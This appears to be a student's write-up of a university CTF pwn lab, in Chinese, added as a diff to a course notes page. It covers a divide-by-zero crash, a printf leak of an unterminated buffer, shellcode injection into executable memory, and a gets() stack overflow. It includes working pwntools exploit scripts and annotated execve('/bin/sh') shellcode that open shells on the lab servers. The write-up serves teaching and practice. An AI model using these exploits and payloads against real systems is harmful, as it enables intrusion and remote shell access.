@@ -2,3 +2,456 @@
 title: Pwn Lab 1：代码注入与栈溢出
 ---
 import Card from '@md-components/card.vue';
+import Asciinema from '@md-components/AsciinemaWrapper.vue';
+
+{/* IRON:0ff8n1ipynsqqsrd5yxt2f1x701lkddp:OB */}
+
+import PasswordContainer from '@md-components/passwordContainer.vue';
+
+<PasswordContainer md5="518dcf1168627415f19b4d9a711359f3">
+
+# Task 1: nocrash (10%)
+
+<Card type="task" title="任务">
+
+课上作为引子的 `nocrash` 赛题，请通过其熟悉远程攻击，取得 flag
+
+- `[lec1] pwn nocrash` 题目位于比赛平台上
+
+请在报告中附上漏洞分析以及做法，给出成功拿到 flag 的截图，并将攻击代码以附件形式上传
+
+</Card>
+
+~~怎么直接给源码了，剥夺我反编译的乐趣~~
+
+```c
+...
+	for (; i > 0; i--) {
+		j = a / pow(b, i - 1);
+		printf("%d", j);
+		a = a % (int)pow(b, i - 1);
+	}
+...
+```
+
+省流：除零异常，知道这个后面的就好办了
+
+
+import castChal1 from './casts/pwn1-chal1.cast?url'
+
+<Asciinema url={castChal1} />
+
+
+# Task 2: login_me (30%)
+
+<Card type="task" title="任务">
+
+复现，并完成课上讲解的 `login_me` 赛题，取得远程的 flag
+
+- `[lec1] pwn login_me` 题目位于比赛平台上
+
+请在报告中附上漏洞分析以及做法，给出成功拿到 flag 的截图，并将攻击代码以附件形式上传
+
+</Card>
+
+
+
+
+```c
+...
+	char username[BUFFER_SIZE];
+	char password[BUFFER_SIZE];
+	char password_verify[BUFFER_SIZE];
+...
+```
+
+这里的内存结构是，password后面紧接着 password_verify ，而后者将会存储真实的密码
+
+```c
+int get_password(char *name, char *buf)
+{
+	unsigned int length;
+	printf("Hello %s, please tell me the length of your password\n", name);
+	scanf("%d", &length);
+
+	if (length > BUFFER_SIZE)
+	{
+		printf("you password is way too long");
+		return -1;
+	}
+	else
+	{
+		printf("cool, input your password\n");
+		return read(STDIN_FILENO, buf, BUFFER_SIZE);
+	}
+}
+```
+
+而我们只要让read把buf读满，结尾没有`\0`，就会导致printf在输出时继续读取后面的内容，这种方法可以leak出password_verify的内容。
+
+```c
+...
+wrong_password:
+	printf("What's wrong with you? Are you a hacker?\n");
+	printf("----------------- LOG -----------------\n");
+	printf("you input name as %s (len %d)\n", username, strlen(username));
+	printf("you input password as %s (len %d)\n", password, strlen(password));
+	printf("---------------------------------------\n");
+	return -1;
+...
+```
+
+>        <b>s      </b>If no <b>l </b>modifier is present: the <i>const char *</i> argument is
+>             expected to be a pointer to an array of character type
+>             (pointer to a string).  Characters from the array are
+>             written up to (but not including) a terminating null byte
+>             ('\0'); if a precision is specified, no more than the
+>             number specified are written.  If a precision is given, no
+>             null byte need be present; if the precision is not
+>             specified, or is greater than the size of the array, the
+>             array must contain a terminating null byte.
+>
+>(ref: [printf(3) - Linux manual page](https://www.man7.org/linux/man-pages/man3/printf.3.html))
+
+然后就有shell了，后面就好办了。
+
+import castChal2 from './casts/pwn1-chal2.cast?url'
+
+<Asciinema url={castChal2} />
+
+
+# Task 3: inject_me (30%)
+
+<Card type="task" title="任务">
+
+课上讲解的 `inject_me` 赛题，请实现
+
+1. 按题目要求实现 5 种功能的 `delegate` 代码，完成后取得flag第一部分 (15 points)
+2. 学习 shellcode (5 points) 并通过 shellcode 攻击拿到远程的 shell，并得到另外的 flag 内容 (15 points)
+
+- `[lec1] pwn inject_me` 题目位于比赛平台上
+
+请在报告中附上漏洞分析以及做法，给出对于你使用的 shellcode 代码的分析（这个代码到底干了啥），给出成功拿到 flag 的截图，并将攻击代码以附件形式上传
+
+
+</Card>
+
+## Analysis
+
+因为要输入shellcode，到这里就要开pwntools了
+
+```c
+    int (*funcptr)(int, int);
+ 
+    ...
+
+    address = mmap(MAP_ADDR, size, PROT_EXEC | PROT_READ | PROT_WRITE, 
+                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+
+    if (address == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+
+    funcptr = address;
+```
+
+这就是很经典的给一段可执行内存的写法，然后我们就有两种选择：正常写shell或者直接`execve('/bin/sh',NULL,NULL)`
+
+## Pwn 
+
+*按题目要求实现 5 种功能的 `delegate` 代码*
+
+```python
+
+from pwn import *
+context.log_level = 'debug'
+
+# Shellcodes for each operation
+shellcodes = {
+    'ADD': asm('''
+        mov eax, edi
+        add eax, esi
+        ret
+    '''),
+    'SUB': asm('''
+        mov eax, edi
+        sub eax, esi
+        ret
+    '''),
+    'AND': asm('''
+        mov eax, edi
+        and eax, esi
+        ret
+    '''),
+    'OR': asm('''
+        mov eax, edi
+        or eax, esi
+        ret
+    '''),
+    'XOR': asm('''
+        mov eax, edi
+        xor eax, esi
+        ret
+    ''')
+}
+
+# Start the process
+p = process('./inject_me')
+
+for i, op in enumerate(['ADD', 'SUB', 'AND', 'OR', 'XOR'], start=1):
+    p.recvuntil(f'Request-{i}: '.encode())
+    p.send(shellcodes[op])
+
+
+p.recvuntil(b'first part of flag:\n')
+flag = p.recvline().decode().strip()
+log.success(f"Flag: {flag}")
+
+p.close()
+```
+import castChal3_1 from './casts/pwn1-chal3-1.cast?url'
+
+<Asciinema url={castChal3_1} />
+
+*Shellcode*
+
+请出我们的老朋友：[Linux/x86-64 - execve("/bin/bash",\{NULL\},\{NULL\}) - 24 bytes](https://shell-storm.org/shellcode/files/shellcode-909.html)
+
+解释shellcode：
+
+```x86asm
+.global _start
+_start:
+    mov rax, 0x68732f6e69622f  ; 将字符串"/bin/sh"的16进制表示存入rax
+    ; 机器码: 48 b8 2f 62 69 6e 2f 73 68 00
+    ; 48: REX.W前缀表示64位操作
+    ; b8: mov rax, imm64 的操作码
+    ; 后面跟着8字节的小端序立即数: 0x0068732f6e69622f
+
+    push rax                   ; 将rax值压入栈(现在栈顶是字符串"/bin/sh\0")
+    ; 机器码: 50 
+
+    push rsp                   ; 将栈指针压入栈(现在栈顶是字符串的地址)
+    ; 机器码: 54
+
+    pop rdi                    ; 弹出栈顶到rdi(rdi现在指向"/bin/sh\0")
+    ; 机器码: 5f 
+
+    xor eax, eax               ; 清零eax(同时也清零了rax的高32位)
+    ; 机器码: 31 c0
+
+    push rax                   ; 将0压入栈(作为argv数组的结束标记NULL)
+    ; 机器码: 50
+
+    mov al, 59                 ; 将系统调用号59(execve)存入al
+    ; 机器码: b0 3b
+    ; b0: mov al, imm8 的操作码
+    ; 3b: 59的16进制表示
+
+    push rsp                   ; 将当前栈指针压入栈(指向NULL)
+    ; 机器码: 54
+
+    pop rdx                    ; 弹出到rdx(rdx现在是envp参数，设为NULL)
+    ; 机器码: 5a
+
+    push rsp                   ; 再次压入栈指针(现在指向argv数组)
+    ; 机器码: 54
+
+    pop rsi                    ; 弹出到rsi(rsi现在指向argv数组)
+    ; 机器码: 5e
+
+    syscall                    ; 执行系统调用(execve)
+    ; 机器码: 0f 05
+```
+
+顺便一提这一题和后面两题都要用这个shellcode ~~（最有资源复用的一集~~
+
+Exp:
+
+```python
+from pwn import *
+
+p = remote("127.0.0.1", 5561)
+context.log_level='debug'
+
+# Our shellcode for execve("/bin/sh", NULL, NULL) 
+# credit: https://shell-storm.org/shellcode/files/shellcode-909.html
+shellcode = bytes([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 
+                   0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 
+                   0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 
+                   0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05])
+
+payload1 = shellcode 
+
+print(f"Payload 1 length: {len(payload1)}")
+
+p.recvuntil(b"performing ADD")
+p.sendline(payload1)
+
+p.interactive()
+```
+
+import castChal3_2 from './casts/pwn1-chal3-2.cast?url'
+
+<Asciinema url={castChal3_2} />
+
+# Task 4: sbofsc (30%)
+
+
+<Card type="task" title="任务">
+
+（课上稍微预告的）题目 `sbofsc` 是栈上缓冲区溢出 + shellcode 的组合题目，请完成该赛题
+
+- `[lab1] pwn sbofsc` 题目位于比赛平台上
+
+</Card>
+
+## Analysis
+
+
+```c
+int main(int argc, char *argv[])
+{
+    prepare(); // quite necessary
+    
+    int rndval;
+    int size = sysconf(_SC_PAGESIZE);
+    char *rndstr = getenv(RDNKEY);
+    char buffer[32];
+    
+    sscanf(rndstr, "%d", &rndval);
+    
+    uint64_t map_addr = MAP_ADDR + ((rndval % 8) * 0x1000);
+    mmap(map_addr, size, PROT_EXEC | PROT_READ | PROT_WRITE, 
+	     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    puts("what's your name: ");
+    read(0, map_addr, 64);
+    puts("try to overflow me~");
+    gets(buffer);
+    return 0;
+}
+```
+
+**栈溢出**
+
+
+```c
+char buffer[32];
+// ...
+gets(buffer);
+```
+
+程序中使用了不安全的`gets()`函数来读取用户输入到`buffer`数组中。`buffer`被定义为32字节的字符数组，但`gets()`函数不会检查输入的长度，导致可以写入超过32字节的数据，造成栈溢出。攻击者可以利用此漏洞覆盖栈上的返回地址，控制程序执行流程。
+
+**Shellcode注入**
+
+```c
+char *rndstr = getenv(RDNKEY);
+// ...
+uint64_t map_addr = MAP_ADDR + ((rndval % 8) * 0x1000);
+mmap(map_addr, size, PROT_EXEC | PROT_READ | PROT_WRITE, 
+     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+// ...
+read(0, map_addr, 64);
+```
+
+*请输入文本.jpg*
+
+## Pwn
+
+主要是要猜shellcode 的地址。我一开始以为每一次的环境变量`RDNKEY` 都会变，后来发现`RNDKEY`是固定的，是需要我来猜地址
+
+```python
+from pwn import *
+
+p = remote("127.0.0.1", 8366)
+context.log_level = 'debug'
+
+
+RND = 5     # <-- 这里的RND是试的，每次运行前修改即可
+
+# Our shellcode for execve("/bin/sh", NULL, NULL) 
+# credit: https://shell-storm.org/shellcode/files/shellcode-909.html
+shellcode = bytes([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 
+                   0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 
+                   0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 
+                   0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05])
+
+
+
+# Step 1
+payload1 = shellcode + b'A' * (64 - len(shellcode))
+p.recvuntil(b"what's your name: ")
+p.send(payload1)
+
+# Step 2
+padding = b'A' * (0x40+0x8)          # Overflow buffer and saved RBP
+ret_addr = p64((RND % 8 + 32) << 12) # Address of shellcode
+payload2 = padding + ret_addr
+p.recvuntil(b"try to overflow me~")
+p.sendline(payload2)
+
+# Pwn!
+p.interactive()
+```
+
+import castChal4 from './casts/pwn1-chal4.cast?url'
+
+<Asciinema url={castChal4} />
+
+
+# Bonus: shellcode (+15%)
+
+<Card type="task" title="任务">
+
+位于校巴的“超老” shellcode 赛题，在完成以上的基础后，做它一定是砍瓜切菜
+
+- [题目信息](https://zjusec.com/challenges/7)
+
+> 注：这个题是 32 位架构的 shellcode 哦，不要弄错了
+
+请在报告中附上漏洞分析以及做法，给出成功拿到 flag 的截图，并将攻击代码以附件形式上传
+
+</Card>
+
+```c
+char shellcode[35];
+read(0, shellcode, 35);
+(*(void (*)()) shellcode)();
+```
+
+Just Send it.
+
+[Linux/x86 - execve(/bin/sh) - 28 bytes](https://shell-storm.org/shellcode/files/shellcode-811.html)
+
+```python
+from pwn import *
+
+p = remote("10.214.160.13", 11003)
+context.log_level = 'debug'
+
+# Our shellcode for execve("/bin/sh", NULL, NULL) 
+# credit: https://shell-storm.org/shellcode/files/shellcode-811.html
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"+\
+            b"\x68\x68\x2f\x62\x69\x6e\x89"+\
+            b"\xe3\x89\xc1\x89\xc2\xb0\x0b"+\
+            b"\xcd\x80\x31\xc0\x40\xcd\x80"
+
+
+
+# Just Send it
+p.recvuntil(b"as assemble instruction")
+p.sendline(shellcode+b'A' * (35 - len(shellcode)))
+
+# Pwn!
+p.interactive()
+```
+
+import castBonus from './casts/pwn1-bonus.cast?url'
+
+<Asciinema url={castBonus} />
+
+
+
+</PasswordContainer>
